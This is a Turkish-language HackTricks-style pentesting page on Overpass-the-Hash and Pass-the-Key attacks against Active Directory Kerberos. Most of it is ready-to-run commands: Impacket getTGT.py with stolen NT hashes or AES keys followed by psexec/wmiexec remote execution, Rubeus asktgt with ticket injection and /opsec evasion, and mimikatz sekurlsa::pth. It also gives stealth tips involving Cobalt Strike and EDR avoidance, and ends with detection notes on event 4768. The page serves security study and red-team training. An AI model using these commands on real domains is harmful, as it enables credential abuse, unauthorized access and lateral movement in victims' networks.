# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** saldırısı, geleneksel NTLM protokolünün kısıtlandığı ve Kerberos authentication'ın öncelikli olduğu ortamlara yöneliktir. Bu saldırı, bir kullanıcının NTLM hash'ini veya AES key'lerini kullanarak Kerberos ticket'ları talep eder ve network içindeki kaynaklara yetkisiz erişim sağlar.

Strictly speaking:

- **Over-Pass-the-Hash** genellikle **NT hash** değerini **RC4-HMAC** Kerberos key'i aracılığıyla bir Kerberos TGT'sine dönüştürmek anlamına gelir.
- **Pass-the-Key**, zaten **AES128/AES256** gibi bir Kerberos key'ine sahip olduğunuz ve bu key ile doğrudan bir TGT talep ettiğiniz daha genel bir versiyondur.

Bu fark hardened ortamlarda önemlidir: **RC4 devre dışıysa** veya KDC tarafından artık varsayılan olarak kabul edilmiyorsa, yalnızca **NT hash** yeterli değildir ve bir **AES key**'ine (veya bundan türetmek için cleartext password'e) ihtiyaç duyarsınız.

Bu saldırıyı gerçekleştirmek için ilk adım, hedef kullanıcının hesabına ait NTLM hash'ini veya password'ünü elde etmektir. Bu bilgiler güvence altına alındıktan sonra hesap için bir Ticket Granting Ticket (TGT) elde edilebilir; bu da attacker'ın kullanıcının izinlerine sahip olduğu service'lere veya makinelere erişmesini sağlar.

Process aşağıdaki command'lerle başlatılabilir:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256 gerektiren senaryolarda `-aesKey [AES key]` seçeneği kullanılabilir:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` ayrıca `-service <SPN>` ile bir **AS-REQ** üzerinden doğrudan bir **service ticket** istemeyi destekler; bu, ekstra bir **TGS-REQ** olmadan belirli bir **SPN** için ticket istediğinizde kullanışlı olabilir:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Ayrıca, elde edilen ticket `smbexec.py` veya `wmiexec.py` gibi çeşitli araçlarla kullanılabilir ve attack kapsamı genişletilebilir.

_PyAsn1Error_ veya _KDC cannot find the name_ gibi karşılaşılan sorunlar genellikle Impacket library güncellenerek ya da IP address yerine hostname kullanılarak çözülür; böylece Kerberos KDC ile uyumluluk sağlanır.

Rubeus.exe kullanan alternatif bir command sequence, bu tekniğin başka bir yönünü gösterir:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Bu yöntem **Pass the Key** yaklaşımını taklit eder ve ticket'ı doğrudan authentication amacıyla ele geçirip kullanmaya odaklanır. Uygulamada:

- `Rubeus asktgt`, **raw Kerberos AS-REQ/AS-REP** isteğini kendisi gönderir ve `/luid` ile başka bir logon session'ı hedeflemek veya `/createnetonly` ile ayrı bir session oluşturmak istemediğiniz sürece admin yetkilerine ihtiyaç duymaz.
- `mimikatz sekurlsa::pth`, credential materyalini bir logon session'a patch eder ve bu nedenle **LSASS**'a dokunur. Bu işlem genellikle local admin veya `SYSTEM` gerektirir ve EDR açısından daha fazla gürültü oluşturur.

Mimikatz ile örnekler:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Operasyonel güvenliğe uymak ve AES256 kullanmak için aşağıdaki komut uygulanabilir:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec`, Rubeus tarafından oluşturulan trafiğin native Windows Kerberos trafiğinden biraz farklı olması nedeniyle önemlidir. Ayrıca `/opsec` seçeneğinin **AES256** trafiği için tasarlandığını unutmayın; RC4 ile kullanmak genellikle `/force` gerektirir. Bu da amacın büyük kısmını ortadan kaldırır, çünkü **modern domain'lerde RC4 kullanımı başlı başına güçlü bir sinyaldir**.

## Tespit notları

Her TGT isteği DC üzerinde **`4768` event'i** oluşturur. Güncel Windows build'lerinde bu event, eski writeup'larda belirtilenden daha kullanışlı alanlar içerir:

- `TicketEncryptionType`, verilen TGT için hangi enctype'ın kullanıldığını gösterir. Tipik değerler **RC4-HMAC** için `0x17`, **AES128** için `0x11` ve **AES256** için `0x12` şeklindedir.<sup>[[3]](#references)</sup>
- Güncellenmiş event'ler ayrıca `SessionKeyEncryptionType`, `PreAuthEncryptionType` ve client'ın bildirdiği enctypes bilgilerini de sunar. Bu, **gerçek RC4 bağımlılığını** kafa karıştıran legacy varsayılanlarından ayırt etmeye yardımcı olur.
- Modern bir ortamda `0x17` görülmesi, account'un, host'un veya KDC fallback path'inin hâlâ RC4'e izin verdiğine ve bu nedenle NT-hash tabanlı Over-Pass-the-Hash için daha elverişli olduğuna dair iyi bir ipucudur.

Microsoft, Kasım 2022 Kerberos hardening güncellemelerinden bu yana varsayılan RC4 davranışını kademeli olarak azaltmaktadır. Güncel yayımlanmış yönlendirme, **Q2 2026 sonuna kadar AD DC'leri için varsayılan kabul edilen enctype'lar arasından RC4'ün kaldırılmasını** önermektedir. Offensive açıdan bu, **AES ile Pass-the-Key** yönteminin giderek daha güvenilir bir yol olduğu; klasik **yalnızca NT-hash kullanan OpTH** yönteminin ise hardened estate'lerde daha sık başarısız olmaya devam edeceği anlamına gelir.<sup>[[3]](#references)</sup>

Kerberos encryption type'ları ve ilgili ticketing davranışı hakkında daha fazla bilgi için:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Daha gizli sürüm

> [!WARNING]
> Her logon session aynı anda yalnızca bir aktif TGT'ye sahip olabilir; bu nedenle dikkatli olun.

1. Cobalt Strike'tan **`make_token`** kullanarak yeni bir logon session oluşturun.
2. Ardından, mevcut session'ı etkilemeden yeni logon session için bir TGT oluşturmak üzere Rubeus kullanın.

Rubeus'un kendisini kullanarak da sacrificial **logon type 9** session ile benzer bir izolasyon sağlayabilirsiniz:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Bu, mevcut oturum TGT'sinin üzerine yazılmasını önler ve genellikle ticket'ı mevcut logon session'ınıza import etmekten daha güvenlidir.

## Referanslar

- [1] [Tarlogic - Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Kerberos'ta RC4 Kullanımını Algılama ve Düzeltme](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
